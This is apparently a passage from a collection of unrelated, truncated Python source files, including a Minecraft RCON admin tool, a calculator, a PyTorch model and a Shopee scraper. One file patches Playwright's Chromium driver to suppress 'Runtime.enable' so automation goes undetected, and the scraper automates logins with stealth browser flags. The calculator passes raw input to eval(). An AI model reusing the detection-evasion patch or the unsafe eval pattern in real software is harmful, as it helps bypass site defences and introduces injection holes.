switch_banlist(rcon,joined_players):\n    print(f\"\u76ee\u524d\u7684\u73a9\u5bb6\u5217\u8868\uff1a{', '.join(joined_players)}\")\n    rcon.connect()\n    action = input(\"\u8bf7\u8f93\u5165\u8981\u6267\u884c\u7684\u64cd\u4f5c\uff1a'ips', 'players', 'list', 'add', 'remove'\")\n    if action == 'list':\n        rcon.command('banlist list')\n        print(rcon.command('banlist list'))\n    else:\n        player = input(\"\u8bf7\u8f93\u5165\u8981\u64cd\u4f5c\u7684\u73a9\u5bb6\u540d\u5b57\uff1a\")\n        rcon.command(f'banlist {action} {player}')\n    rcon.disconnect()\n\n# \u5b9a\u4e49\u53ef\u6267\u884c\u6307\u4ee4\u5217\u8868\ncommands = {\n    '1': change_game_mode,\n    '2': teleport_player,\n    '3': give_item,\n    '4': kill_player,\n    '5': ban_player,\n    '6': unban_player,\n    '7': kick_player,\n    '8': switch_weather,\n    '9': switch_time,\n    '10': switch_difficulty,\n    '11': switch_gamerule,\n    '12': switch_whitelist,\n    '13': switch_op,\n    '14': switch_banlist,\n    'exit': None  # \u9000\u51fa\u547d\u4ee4\n}\n#config\\config.toml\nsettings = load_settings(r\"config\\config.toml\")\nrcon = connect_to_server(sett",
    "import sys\nimport re\nimport os\n\ndef is_patched(file_path: str) -> bool:\n    try:\n        with open(file_path, \"r\") as f:\n            content = f.read()\n            if \"/*Patched By NayutaTeam*/\" in content:\n                return True\n    except FileNotFoundError:\n        pass\n    return False\n\ndef patch_driver(path: str):\n    try:\n        # patch driver\n        print(f'[PATCH] patching driver for \"{path}\"', file=sys.stderr)\n\n        def replace(path: str, old_str: str, new_str: str):\n            try:\n                with open(path, \"r\") as f:\n                    content = f.read()\n                content = content.replace(old_str, new_str)\n                with open(path, \"w\") as f:\n                    f.write(content)\n                print(f'Patch applied to {path}')\n            except Exception as e:\n                print(f'Error patching {path}: {e}', file=sys.stderr)\n\n        server_path = os.path.join(path, \"package\", \"lib\", \"server\")\n        chromium_path = os.path.join(server_path, \"chromium\")\n\n        # comment out all \"Runtime.enable\" occurrences\n        cr_devtools_path = os.path.join(chromium_path, \"crDevTools.js\")\n        if not is_patched(cr_devtools_path):\n            replace(cr_devtools_path, \"session.send('Runtime.enable'),\", \"/*session.send('Runtime.enable'), */\")\n\n        cr_page_path = os.path.join(chromium_path, \"crPage.js\")\n        if not is_patched(cr_page_path):\n            with open(cr_page_path, \"r\") as f:\n                cr_page = f.read()\n                cr_page = cr_page.replace(\"this._client.send('Runtime.enable', {}),\",\n                                          \"/*this._client.send('Runtime.enable', {}),*/\")\n                cr_page = cr_page.replace(\"session._sendMayFail('Runtime.enable');\",\n                                          \"/*session._sendMayFail('Runtime.enable');*/\")\n            with open(cr_page_path, \"w\") as f:\n                f.write(cr_page)\n            print(f'Patch applied to {cr_page_path}')\n\n        cr_sv_worker_path = os.path.join(chromium_path, \"crServiceWorker.js\")\n        if not is_patched(cr_sv_worker_path):\n            replace(cr_sv_worker_path, \"session.send('Runtime.enable', {}).catch(e => {});\",\n                    \"/*session.send('Runtime.enable', {}).catch(e => {});*/\")\n\n        # patch ExecutionContext eval to still work\n        frames_path = os.path.join(server_path, \"frames.js\")\n\n        _context_re = re.compile(r\".*\\s_context?\\s*\\(world\\)\\s*\\{(?:[^}{]+|\\{(?:[^}{]+|\\{[^}{]*\\})*\\})*\\}\")\n        _context_replacement = \\\n            \" async _context(world) {\\n\" \\\n            \"\"\"\n            // atm ignores world_name\n            if (this._isolatedContext == undefined) {\n              var worldName = \"utility\"\n              var result = await this._page._delegate._mainFrameSession._client.send('Page.createIsolatedWorld', {\n                frameId: this._id,\n                grantUniveralAccess: true,\n                worldName: worldName\n              });\n              var crContext = new _crExecutionContext.CRExecutionContext(this._page._delegate._mainFrameSession._client, {id:result.executionContextId})\n              this._isolatedContext = new _dom.FrameExecutionContext(crContext, this, worldName)\n            }\n            return this._isolatedContext\n            \\n\"\"\" \\\n            \"}\"\n        clear_re = re.compile(\n            r\".\\s_onClearLifecycle?\\s*\\(\\)\\s*\\{\")\n        clear_repl = \\\n            \" _onClearLifecycle() {\\n\" \\\n            \"\"\"\n            this._isolatedContext = undefined;\n            \"\"\"\n\n        if not is_patched(frames_path):\n            with open(frames_path, \"r\") as f:\n                frames_js = f.read()\n                frames_js = \"var _crExecutionContext = require('./chromium/crExecutionContext')\\n\" \\\n                            \"var _dom =  require('./dom')\\n\" \\\n                            + \"\\n\" + frames_js\n\n                # patch _context function\n                frames_js = _context_re.subn(_context_replacement, frames_js, count=1)[0]\n                frames_js = clear_re.subn(clear_repl, frames_js, count=1)[0]\n\n            with open(frames_path, \"w\") as f:\n                f.write(frames_js)\n            print(f'Patch applied to {frames_path}')\n\n        # Add patch marker to patched files\n        for patched_file in [cr_devtools_path, cr_page_path, cr_sv_worker_path, frames_path]:\n            if not is_patched(patched_file):\n                with open(patched_file, \"a\") as f:\n                    f.write(\"\\n/*Patched By NayutaTeam*/\")\n                    print(f'Patch marker added to {patched_file}')\n\n    except Exception as e:\n        print(f'Error: {e}', file=sys.stderr)\n\ndef main(path: str = \"\"):\n    try:\n        if not path:\n            path = \".\\\\.playwright\"\n        if not os.path.exists(path):\n            print(f\"Error: Path '{path}' does not exist.\")\n            return\n        patch_driver(path)\n    except Exception as e:\n        print(f\"Error: {e}\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) > 1:\n        pa",
    "import re\nimport fitz  # PyMuPDF\nimport json\nfrom nltk.tokenize import word_tokenize\nfrom datasets import load_dataset\nfrom tqdm import tqdm\n\n\ndef flatten(nested_list):\n    \"\"\"\n    Flatten nested list structure.\n\n    Args:\n        nested_list (list): A nested list structure.\n\n    Yields:\n        object: The flattened elements of the nested list.\n\n    \"\"\"\n    for item in nested_list:\n        if isinstance(item, list):\n            yield from flatten(item)\n        else:\n            yield item\n\n\ndef tokens_generator(file_path, chunk_size=500):\n    \"\"\"\n    Generator function to yield chunks of tokens from a file.\n\n    Parameters:\n    file_path (str): The path to the file containing the tokens.\n    chunk_size (int, optional): The size of each chunk of tokens to yield. Defaults to 500.\n\n    Yields:\n    list: A chunk of tokens from the file.\n\n    \"\"\"\n    tokens = []\n    with open(file_path, 'r') as f:\n        for line in f:\n            new_tokens = json.loads(line)\n            tokens.extend(new_tokens)\n\n            # Yield the tokens in chunks\n            while len(tokens) >= chunk_size:\n                yield tokens[:chunk_size]\n                tokens = tokens[chunk_size:]\n\n        # Yield any remaining tokens after the loop\n        if tokens:\n            yield tokens\n\n\ndef load_and_tokenize_data(dataset_name,\n                           subject_areas: list = None,\n                           keys: list = ['title', 'abstract', 'body_text'],\n                           save_cache: bool = False,\n                           cache_file='temp_tokens.json'):\n    '''\n    Load a dataset, filter by subject area if specified, and tokenize the sentences in the specified keys.\n\n    Args:\n    dataset_name (str): The name of the dataset to load.\n    subject_area (str): The subject area to filter by, optional. By defualt (None) it contains following.\n                        ['AGRI','ARTS','BIOC','BUSI','CENG','CHEM','COMP','DECI',\n                        'DENT','EART','ECON','ENER','ENGI','ENVI','HEAL','IMMU',\n                        'MATE','MATH','MEDI','MULT','NEUR', 'NURS', 'PHAR', 'PHYS',\n                        'PSYC','SOCI','VETE']\n    keys (list): List of keys from which to extract and tokenize text. it contains:\n                        ['title', 'abstract', 'subjareas', 'keywords', 'asjc',\n                          'body_text', 'author_highlights']\n    save_cache (bool): Whether to use a temporary file for storing tokens.\n    cache_file (str): Path to the temporary file for token storage.\n\n    Returns:\n    A generator that yields tokens from the dataset.\n    '''\n    # Load the dataset from hugging face\n    # Note: hugging face automatically split the dataset into 'train', 'test' and 'validation'\n    dataset = load_dataset(dataset_name, trust_remote_code=True)\n\n    # Filter the dataset by subject area if specified\n    if subject_areas:\n        dataset = dataset.filter(lambda x: any(\n            sa in x['subjareas'] for sa in subject_areas))\n\n    if save_cache:\n        # Open a temporary file in write mode to store tokens\n        with open(cache_file, 'w') as f:\n            for key in keys:\n                print('Now')\n                for sentences in tqdm(list(flatten(dataset['train'][key])), desc=f\"Processing {key}\"):\n                    tokens = word_tokenize(sentences)\n                    json.dump(tokens, f)\n                    f.write('\\n')  # Write each list of tokens on a new line\n        # Return the path to the cached file\n        return tokens_generator(cache_file)\n    else:\n        # Process all tokens in memory (for small datasets)\n        tokens = []\n        for key in keys:\n            for sentences in tqdm(list(flatten(dataset['train'][key])), desc=f\"Processing {key}\"):\n                tokens.extend(word_tokenize(sentences))\n        return tokens\n\n\ndef extract_text_from_pdf(pdf_path, skip_first=1, skip_last=2):\n    \"\"\"\n    Extract text from specified pages of a PDF.\n\n    Args:\n        pdf_path (str): The path to the PDF file.\n        skip_first (int, optional): The number of pages to skip from the beginning. Defaults to 1.\n        skip_last (int, optional): The number of pages to skip from the end. Defaults to 2.\n\n    Returns:\n        str: The extracted text from the specified pages of the PDF.\n    \"\"\"\n    doc = fitz.open(pdf_path)\n    text = \"\"\n    start_page = skip_first if skip_first else 0\n    end_page = len(doc) - skip_last\n\n    for page_number in range(start_page, end_page):\n        page = doc.load_page(page_number)\n        text += page.get_text(\"text\")\n\n    doc.close()\n    return text\n\n\ndef clean_text(text):\n    \"\"\"Clean and preprocess extracted text.\"\"\"\n    text = re.sub(r'Page \\d+ of \\d+', '', text)\n    text = re.sub(r'[\\r\\n]+', ' ', text)\n    return text.strip()\n",
    "# Author: Diogo Costa\n# Date: 2024-04-16\n# Description: Calculator with graphical interface\n\n# tkinter library\nimport tkinter as tk\n\n\n# Functions for mathematical operations\ndef sum():\n    try:\n        total = eval(entry.get())\n        result.config(text=str(total))\n    except:\n        result.config(text=\"Invalid input\")\n\n\n# Calculator interface\nroot = tk.Tk()\nroot.title(\"Calculator\")\nroot.geometry(\"225x342\")\n# root.resizable(False, False)\nroot.configure(background=\"white\")\nroot.attributes(\"-alpha\", 0.97, \"-topmost\", True)\n\n# Title label\nlabel = tk.Label(\n    root,\n    text=\"Calculator\",\n    foreground=\"#444\",\n    background=\"#f7f7f7\",\n    height=2,\n    width=14,\n    font=(\"Segoe UI\", 20, \"bold\"),\n    borderwidth=1,\n    relief=\"raised\"\n)\nlabel.grid(row=0, column=0, columnspan=5, pady=0, padx=0)\n\n# Entry field for numbers and operations\nentry = tk.Entry(\n    root,\n    justify='center',\n    width=25,\n    font=(\"Segoe UI\", 12),\n    background=\"#f9f9f9\",\n    foreground=\"black\",\n    borderwidth=1,\n    relief=\"groove\",\n)\nentry.grid(row=1, column=0, columnspan=10, ipady=0, ipadx=0, pady=0, padx=0)\n\n# Result of the calculation\nresult = tk.Label(\n    root,\n    text=\"\",\n    justify='center',\n    font=(\"Segoe UI\", 19, \"bold\"),\n    foreground=\"black\",\n    background=\"white\",\n    borderwidth=1,\n    relief=\"groove\",\n    width=15\n)\nresult.grid(row=2, column=0, columnspan=4, pady=0, padx=0, ipady=0, ipadx=0)\n\n# Menu bar\nmode_var = tk.IntVar()\nmode_var.set(1)\nmenu = tk.Menu(root)\nroot.config(menu=menu)\nfile_menu = tk.Menu(menu, tearoff=0)\nmenu.add_cascade(label=\"Mode\", menu=file_menu)\nfile_menu.add_radiobutton(label=\"Standard\", variable=mode_var, value=1)\nfile_menu.add_radiobutton(label=\"Scientific\", variable=mode_var, value=2)\nfile_menu.add_radiobutton(label=\"Programmer\", variable=mode_var, value=3)\n\n# Buttons for operations\nbuttons = [\n    ('C', 4, 0), ('%', 4, 1), ('/', 4, 2), ('x', 4, 3),\n    ('7', 5, 0), ('8', 5, 1), ('9', 5, 2), ('-', 5, 3),\n    ('4', 6, 0), ('5', 6, 1), ('6', 6, 2), ('+', 6, 3),\n    ('1', 7, 0), ('2', 7, 1), ('3', 7, 2), ('=', 7, 3),\n    ('0', 8, 0), ('.', 8, 1), ('\u232b', 8, 2)\n]\n\nfor (text, row, column) in buttons:\n    button = tk.Button(\n        root,\n        text=text,\n        font=(\"opensans\", 14, \"bold\"),\n        foreground=\"#222\",\n        background=\"grey\",\n        width=3,\n        height=0,\n        command=lambda t=text: on_button_click(t),\n        borderwidth=1,\n        relief=\"groove\",\n        highlightbackground=\"gray\",\n        highlightthickness=1\n    )\n    if text == '=':\n        button.config(width=3, height=3)\n        button.grid(row=row, column=column, padx=0, pady=0, rowspan=2, columnspan=2)\n    else:\n        button.grid(row=row, column=column, padx=0, pady=1)\n\n\n# Function for button clicks\ndef on_button_click(value):\n    if value == '=':\n        try:\n            result.config(text=str(eval(entry.get())))\n        except:\n            result.config(text=\"Error\")\n    elif value == 'C':\n        entry.delete(0, tk.END)\n        result.config(text=\"\")\n    elif value == '\u232b':\n        entry.delete(len(entry.get()) - 1, tk.END)\n    elif value == '%':\n        entry.insert(tk.END, '/100')\n    elif value == 'x':\n        entry.insert(tk.END, '*')\n    elif value == '\u00f7':\n        entry.insert(tk.END, '/')\n    else:\n        entry.insert(tk.END, value)\n\n\nroot.mainloop()",
    "import torch\r\nimport torch.nn as nn\r\nimport numpy as np\r\n\r\n\r\nDEVICE = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\r\nprint(f'Current Device: {DEVICE}. Torch Version: {torch.__version__}')\r\n\r\n\r\nclass Swish(nn.Module):\r\n    \"\"\"\r\n    Swish activation function.\r\n    f(h) = h * sigmoid(beta*h)\r\n    \"\"\"\r\n    def __init__(self, beta=1.):\r\n        super().__init__()\r\n        self.beta = beta\r\n\r\n    def forward(self, x):\r\n        return x * torch.sigmoid(self.beta * x)\r\n\r\n\r\nclass GatedLinearUnit(nn.Module):\r\n    def __init__(self, in_features, out_features, bias=True):\r\n        super().__init__()\r\n        self.fc = nn.Linear(in_features, out_features, bias=bias)\r\n        self.gate = nn.Linear(in_features, out_features, bias=bias)\r\n\r\n    def forward(self, x):\r\n        return self.fc(x) * torch.sigmoid(self.gate(x))\r\n\r\n\r\nclass UnidirectionalAttention(nn.Module):\r\n    \"\"\"\r\n    \u5355\u5411\u7684\u591a\u5934\u6ce8\u610f\u529b\u673a\u5236\u7f51\u7edc\uff0c\u8bbe\u5934\u4e3aM\u4e2a\uff0c\r\n    \u9996\u5148\u5c06\u8f93\u5165\u5c55\u5e73\u6210(B, L, K\u00d7K)\uff0c\r\n    \u7136\u540e\u6bcf\u4e2avector\u5168\u8fde\u63a5\u5f97\u5230\u4e00\u4e2akey\uff0ckey\u2208(B, Dk, K\u00d7K),\r\n    \u7528Channel Mask\u540e\u5168\u8fde\u63a5\u5f97\u5230value\uff0cval\u2208(B, Dv, K\u00d7K)\r\n    \u53d6\u4e2d\u95f4\u7684\u76ee\u6807\u50cf\u5143\u7684key\u4f5c\u4e3aquery,\u5f97que\u2208(B, Dk, 1),\r\n    \u91c7\u7528\u591a\u5934\uff0c\u6bcf\u4e2a\u5c0fkey\u5c31\u88ab\u5206\u5272\u4e3askey\u2208(B, Dk//M, K\u00d7K),\r\n    sque\u540c\u7406\uff0c\u4e3a(B, Dk//M, 1),\r\n    \u63a5\u7740\u7528sque\u53bb\u5bf9skey\u505aatten, K^T*Q/sqrt(Dk) \u518dsoftmax \u5f97\u5230 (B, K\u00d7K, 1)=atten,\r\n    sval\u5c5e\u4e8e(B, Dv//M, K\u00d7K)\uff0csval*atten\u2208(B, Dv//M, 1)\uff0c\r\n    \u6bcf\u4e2a\u5934\u6ce8\u610f\u529b\u4e00\u4e0b\u62fc\u63a5\u5c31\u5f97\u5230\u4e86(B, Dv, 1)\uff0c\u4f5c\u4e3a\u63d0\u53d6\u7684\u7a7a\u95f4\u7279\u5f81\r\n    \u6ce8\u610f\uff1a\u8fd9\u65f6\u5149\u8c31\u4fe1\u606f\u7684value\u8fd8\u6ca1\u6709\u88ab\u52a0\u8fdb\u53bb\uff0c\u56e0\u4e3a\u505aattention\u65f6\u6545\u610f\u906e\u76d6\u4e86\u5149\u8c31\u4fe1\u606f\uff0c\r\n    \u6240\u4ee5\u7a7a\u95f4\u7279\u5f81\u8981\u52a0\u4e0a\u4e00\u4e2akey\u7684\u4e2d\u95f4\u503c(B, Dv, 1)\uff0c\u624d\u80fd\u6210\u4e3a\u7a7a-\u8c31\u4fe1\u606f\u3002\r\n    \"\"\"\r\n    def __init__(self, L, K, n_head=4, val_dim=128, key_dim=128):\r\n        super().__init__()\r\n        self.L, self.K = L, K\r\n        assert n_head == 0 or (val_dim % n_head == 0 and key_dim % n_head == 0)\r\n        self.head_num = n_head\r\n        n_head = 1 if n_head == 0 else n_head\r\n        self.val_split = val_dim // n_head\r\n        self.key_split = key_dim // n_head\r\n        self.val_dim = val_dim\r\n        self.key_dim = key_dim\r\n        self.seq_len = K * K\r\n        self.seq_center = self.seq_len // 2\r\n        self.central_mask = torch.zeros(1, 1, self.seq_len).to(DEVICE)\r\n        self.central_mask[..., self.seq_center] = -1e6\r\n        self.softmax = nn.Softmax(dim=2)\r\n\r\n        self.w_key = nn.Linear(L, key_dim)\r\n        self.w_val = nn.Linear(L, val_dim)\r\n        self.w_que = nn.Linear(L, key_dim)\r\n\r\n        self.nearby_gate = nn.Sequential(nn.Linear(val_dim, 1), nn.Sigmoid())\r\n        self.nearby = torch.tensor(0.).to(DEVICE)\r\n        self._init_weight()\r\n\r\n    def _init_weight(self):\r\n        for name, param in self.named_parameters():\r\n            if len(param.shape) == 2:\r\n                stdv = 1.0 / param.shape[1] ** 0.5\r\n                torch.nn.init.uniform_(param, -stdv, stdv)\r\n\r\n    def forward(self, x):\r\n        \"\"\"\r\n        :param x: x\u7684shape\u5fc5\u987b\u662f(B, L, K, K), \u662f\u4e00\u4e2apatch\r\n        \"\"\"\r\n        x = x.view(x.shape[0], x.shape[1], self.K**2).transpose(1, 2)  # (B, KK, L)\r\n        keys = self.w_key(x)  # (B, KK, Dk)\r\n        vals = self.w_val(x)  # (B, KK, Dv)\r\n        query = self.w_que(x[:, self.seq_center:self.seq_center+1])  # (B, 1, Dk)\r\n\r\n        attended_val = []\r\n        for head_idx in range(self.head_num):\r\n            small_key = keys[..., head_idx * self.key_split: (head_idx+1) * self.key_split]\r\n            small_query = query[..., head_idx * self.key_split: (head_idx+1) * self.key_split]\r\n\r\n            small_atten_weight = small_query @ small_key.transpose(1, 2) / np.sqrt(self.key_dim)\r\n            small_atten = self.softmax(small_atten_weight+self.central_mask)\r\n\r\n            small_val = vals[..., head_idx * self.val_split: (head_idx+1) * self.val_split]\r\n            attended_val.append(small_atten @ small_val)\r\n\r\n        central_val = vals[:, self.seq_center:self.seq_center+1]\r\n\r\n        if self.head_num == 0:\r\n            return central_val\r\n\r\n        surround_val = torch.cat(attended_val, dim=2)\r\n        self.nearby = self.nearby_gate(central_val - surround_val)\r\n\r\n        return central_val + self.nearby * surround_val\r\n\r\n\r\nclass RuaAE(nn.Module):\r\n    def __init__(self, L, P, K, edm, model_dim=128, n_head=4, scale_range=0.2):\r\n        super().__init__()\r\n        self.model_dim = model_dim\r\n        self.L, self.P, self.K = L, P, K\r\n        self.scale_range = scale_range\r\n        self.endmember = nn.Parameter(edm)\r\n\r\n        self.uda = UnidirectionalAttention(L, K,\r\n                                           n_head=n_head,\r\n                                           key_dim=model_dim,\r\n                                           val_dim=model_dim,\r\n                                           )\r\n\r\n        self.ffn = nn.Sequential(     # feed forward network\r\n            Swish(),\r\n            GatedLinearUnit(model_dim, 64),\r\n            nn.BatchNorm1d(64),\r\n            Swish(),\r\n            GatedLinearUnit(64, P),\r\n            nn.Softmax(dim=1),\r\n        )\r\n        self.scalar = nn.Sequential(  # for scaling endmembers\r\n            Swish(),\r\n            GatedLinearUnit(model_dim, 64),\r\n            nn.BatchNorm1d(64),\r\n            Swish(),\r\n            GatedLinearUnit(64, P),\r\n            nn.Tanh()",
    "import os\nimport time\nfrom DrissionPage import ChromiumPage, ChromiumOptions, SessionPage\nfrom bs4 import BeautifulSoup\n\ndef readData(fileName):\n    f = open(fileName, 'r', encoding='utf-8')\n    f.flush()\n    data = []\n    for i, line in enumerate(f):\n        try:\n            line = repr(line)\n            line = line[1:len(line) - 3]\n            data.append(line)\n        except:\n            print(\"err\")\n    f.close()\n    return data\n\ndef append_to_file(file_name, content):\n    \"\"\"Append content to a file.\"\"\"\n    with open(file_name, 'a') as file:\n        file.write(content + os.linesep)\ndef createChromeDriver():\n    try:\n        #os.system('rm -rf /tmp/DrissionPage/userData_9222/Default')\n        options = ChromiumOptions()\n        options.set_paths('/usr/bin/google-chrome')\n\n        arguments = [\n            \"-no-first-run\",\n            \"-force-color-profile=srgb\",\n            \"-metrics-recording-only\",\n            \"-password-store=basic\",\n            \"-use-mock-keychain\",\n            \"-export-tagged-pdf\",\n            \"-no-default-browser-check\",\n            \"-disable-background-mode\",\n            \"-enable-features=NetworkService,NetworkServiceInProcess,LoadCryptoTokenExtension,PermuteTLSExtensions\",\n            \"-disable-features=FlashDeprecationWarning,EnablePasswordsAccountStorage\",\n            \"-deny-permission-prompts\",\n            \"-disable-gpu\",\n\n        ]\n\n        for argument in arguments:\n            options.set_argument(argument)\n\n        driver = ChromiumPage(options)\n\n        return driver\n    except Exception as e:\n        print(f'setup_chromium exception: {str(e)}')\n\ndef loginShoppe(driver, userName, passWord):\n    try:\n        driver.get('https://shopee.vn')\n        time.sleep(3)\n        eleSearch = driver.eles('.shopee-searchbar-input__input')\n        if len(eleSearch) > 0:\n            return True\n\n        driver.ele('@name=loginKey').input(userName)\n        time.sleep(1)\n        driver.ele('@name=password').input(passWord)\n        time.sleep(1)\n        driver.ele('xpath://button[contains(text(), \"\u0110\u0103ng nh\u1eadp\")]').click()\n\n        return True\n    except Exception as e:\n        print('Login err' + str(e))\n        return False\n\ndef searchKeyWord(driver, keyWord):\n    try:\n        driver.get('https://shopee.vn/search?keyword=' + keyWord)\n        time.sleep(1)\n        return True\n    except Exception as e:\n        print('Search err' + str(e))\n        return False\n\ndef scroll_and_wait(driver):\n    \"\"\"Scrolls down the page smoothly and waits for data to load.\"\"\"\n    scroll_script = \"\"\"\n        var scroll = document.body.scrollHeight / 10;\n        var i = 0;\n        function scrollit(i) {\n            window.scrollBy({top: scroll, left: 0, behavior: 'smooth'});\n            i++;\n            if (i < 5) {\n                setTimeout(scrollit, 500, i);\n            }\n        }\n        scrollit(i);\n    \"\"\"\n    driver.run_js(scroll_script)\n\ndef fetch_page_data(driver):\n    \"\"\"Fetch HTML of the page.\"\"\"\n    try:\n        return driver.ele('.WaPg2j').html\n    except Exception as e:\n        print(f'Error fetching page data: {str(e)}')\n        return None\n\ndef extract_product_details(item):\n    \"\"\"Extract details of a single product.\"\"\"\n    name = item.find('img', alt=True)['alt'] if item.find('img', alt=True) else None\n    image_link = item.find('img', src=True)['src'] if item.find('img', src=True) else None\n    price_details = item.select_one('div.flex-shrink div.truncate.flex.items-baseline')\n    price = price_details.get_text(strip=True).replace(\"\u20ab\", \"\").strip() if price_details else None\n    numberOfSold = item.select_one('div.truncate.text-shopee-black87.text-xs.min-h-4.flex-shrink-1').get_text(strip=True) if item.select_one('div.truncate.text-shopee-black87.text-xs.min-h-4.flex-shrink-1') else None\n    linkProduct = item.find('a', class_='contents')['href'] if item.find('a', class_='contents') and 'href' in item.find('a', class_='contents').attrs else None\n\n    return [name, price, linkProduct, image_link, numberOfSold] if all([name, image_link, price, numberOfSold, linkProduct]) else None\n\n\ndef click_next_page(driver):\n    \"\"\"Navigate to the next page of search results if available.\"\"\"\n    try:\n        driver.run_js('document.querySelector(\".shopee-icon-button--right\").click()')\n        time.sleep(1)\n    except Exception as e:\n        print(f'Error clicking next page: {str(e)}')\n\ndef is_end_of_page(data):\n    \"\"\"Check if the end of the page is reached.\"\"\"\n    return 'shopee-icon-button shopee-icon-button--right shopee-icon-button--disabled' in data\n\ndef process_search_results(driver):\n    \"\"\"Extract and save product details from search results.\"\"\"\n    while True:\n        scroll_and_wait(driver)  # Simulate user scroll\n        data = fetch_page_data(driver)\n        if not data or is_end_of_page(data):\n            break\n\n        parse_and_save_products(data)\n        click_next_page(driver)\n\ndef parse_and_save_products(data):\n    \"\"\"Parse product details from HTML and save to file.\"\"\"\n    soup = BeautifulSo",
    "# discord Imports\r\nimport discord\r\nfrom discord.ext import commands\r\n\r\n# other imports\r\nfrom typing import Literal, Optional\r\nimport datetime\r\n\r\n# \"bot\" for commands/events, prefix \".\", permissions \"all\"\r\nbot = commands.Bot(command_prefix=\".\", intents = discord.Intents.all())\r\n\r\n# start message \r\n@bot.event\r\nasync def on_ready():\r\n    print(f\"Logged in as {bot.user.name}\") # <-- bot name\r\n    print(f\"Bot ID: {bot.user.id}\") # <-- bot ID\r\n    print(\"Bot is ready.\") # <-- ready message\r\n\r\n# command for syncing slash commands\r\n@bot.command()\r\n@commands.guild_only()\r\n@commands.is_owner()\r\nasync def sync(ctx: commands.Context, guilds: commands.Greedy[discord.Guild], spec: Optional[Literal[\"guild\", \"global\", \"clear\"]] = None) -> None: # <-- command usages\r\n    embed = discord.Embed(title=\"Synced successfully!\", color=0x99e699)  # <-- embed title and color\r\n\r\n    if not guilds:\r\n        if spec == \"guild\": # <-- sync to the current guild\r\n            synced = await ctx.bot.tree.sync(guild=ctx.guild)\r\n        elif spec == \"global\": # <-- sync to all guilds\r\n            ctx.bot.tree.copy_global_to(guild=ctx.guild)\r\n            synced = await ctx.bot.tree.sync(guild=ctx.guild)\r\n        elif spec == \"clear\": # <-- clear and sync in the current guild\r\n            ctx.bot.tree.clear_commands(guild=ctx.guild)\r\n            await ctx.bot.tree.sync(guild=ctx.guild)\r\n            synced = []\r\n        else: # <-- sync all slash commands \r\n            synced = await ctx.bot.tree.sync()\r\n\r\n        embed.description = f\"Synced `{len(synced)}` slash-command/s {'globally' if spec is None else 'in the current guild.'}\" # <-- message about the sync\r\n    \r\n    else:\r\n        ret = 0\r\n        for guild in guilds: # <-- for guild ID's \r\n            try:\r\n                await ctx.bot.tree.sync(guild=guild)\r\n            except discord.HTTPException: # <-- sync with discord \r\n                pass\r\n            else:\r\n                ret += 1\r\n\r\n        embed.description = f\"Synced to `{ret}/{len(guilds)}` Guild/s.\" # <-- Message about sync for multiple guilds\r\n\r\n    if ctx.author.avatar:\r\n        avatar_url = ctx.author.avatar.url # <-- getting avatar \r\n    else:\r\n        avatar_url = ctx.author.default_avatar.url # <-- getting default avatar if avatar is none\r\n    embed.set_footer(text=f\"{ctx.author.name}\u30fb{datetime.datetime.now().strftime('%H:%M:%S')}\", icon_url=avatar_url)  # <-- embed footer (you can change %H:%M:%S to your time format)\r\n\r\n    await ctx.send(embed=embed) # <-- send embed\r\n\r\n\r\n# ping command\r\n    \r\n@bot.tree.command(name=\"ping\", description=\"Shows the bot's ping\")\r\nasync def ping(interaction: discord.Interaction):\r\n    requester_name = interaction.user.name # <-- getting username\r\n    requester_avatar_url = interaction.user.avatar.url if interaction.user.avatar else interaction.user.default_avatar.url # <-- getting avatar \r\n    latency = round(bot.latency * 1000) # <-- convert to milliseconds\r\n    current_time = datetime.datetime.now().strftime(\"%H:%M:%S\") # <-- time (you can change %H:%M:%S to your time format)\r\n    ping_embed = discord.Embed(title=\"\ud83c\udfd3 Pong!...\", description=f\"My ping is `{latency}ms`.\", color=0xccccff) \r\n    ping_embed.set_footer(text=f\"{requester_name}\u30fb{current_time}\", icon_url=requester_avatar_url) # <-- embed footer \r\n    await interaction.response.send_message(embed=ping_embed) # <-- send embed \r\n    \r\n# add more code here\r\n#>\r\n\r\n\r\n# end - run bot  \r\nwith open(\"token.txt\") as f: # <-- token = token.txt (security to upload the code safely)\r\n    token = f.read()\r\n\r\nbot.run(token)\r\n",
    "import itertools\nimport numpy as np\nfrom cffi import FFI\n\n\nffi = FFI()\nffi.set_source(\"_test\", \"\"\"               \nint graphDistTo( int i0, int* dj,int lendj, int* edges, int nedges)\n{\n    for(int i =0 ;i < lendj ; i++)\n    {\n        dj[i] = 1000000;//Positive infinity\n    }\n    \n    dj[i0] = 0;\n    \n    int hasChanged = 1;\n    int niter = 0;\n    while( hasChanged == 1)\n    {\n     niter = niter+1;\n     hasChanged = 0;\n    //edges already contain reverse edges\n    for( int i = 0 ; i < nedges ; i++)\n    {\n       int e0 = edges[2*i];\n       int e1 = edges[2*i+1];\n       int min = dj[e0];\n       if( dj[e1] + 1 < min)\n       {\n         min = dj[e1]+1;\n         hasChanged = 1;\n       }\n       dj[e0] = min;\n       \n                       \n    }\n    }\n    return niter;\n}\n\nint batchGraphDistTo( int* ind,int* revind, int nbind, int* dj, int lendj, int* edges, int nedges )              \n{\n    int max = -1;\n    for( int k = 0 ; k < nbind ; k++ )\n    {\n      int i0 = ind[k];\n      int j0 = revind[k];\n      if (i0 == j0) continue;\n      graphDistTo(i0,dj,lendj,edges,nedges);\n      if( dj[j0] > max)\n      {\n        max = dj[j0];\n      }      \n    }\n    return max;\n}\n\n\"\"\")\nffi.cdef(\"\"\"int graphDistTo(int, int*,int,int*,int);\"\"\")\nffi.cdef(\"\"\"int batchGraphDistTo( int* ind,int* revind, int nbind, int* dj, int lendj, int* edges, int nedges );\"\"\")\nffi.compile()\n\nfrom _test import lib     # import the compiled library\n\n\n\n'''Copy pasted and adapted from https://www.geeksforgeeks.org/building-an-undirected-graph-and-finding-shortest-path-using-dictionaries-in-python/'''\n# Code only use to check computation by brute-force\n# Python implementation to find the \n# shortest path in the graph using \n# dictionaries \n \n# Function to find the shortest\n# path between two nodes of a graph\ndef BFS_SP(graph, start, goal):\n    explored = []\n     \n    # Queue for traversing the \n    # graph in the BFS\n    queue = [[start]]\n     \n    # If the desired node is \n    # reached\n    if start == goal:\n        #print(\"Same Node\")\n        return list(start)\n     \n    # Loop to traverse the graph \n    # with the help of the queue\n    while queue:\n        path = queue.pop(0)\n        node = path[-1]\n         \n        # Condition to check if the\n        # current node is not visited\n        if node not in explored:\n            neighbours = graph[node]\n             \n            # Loop to iterate over the \n            # neighbours of the node\n            for neighbour in neighbours:\n                new_path = 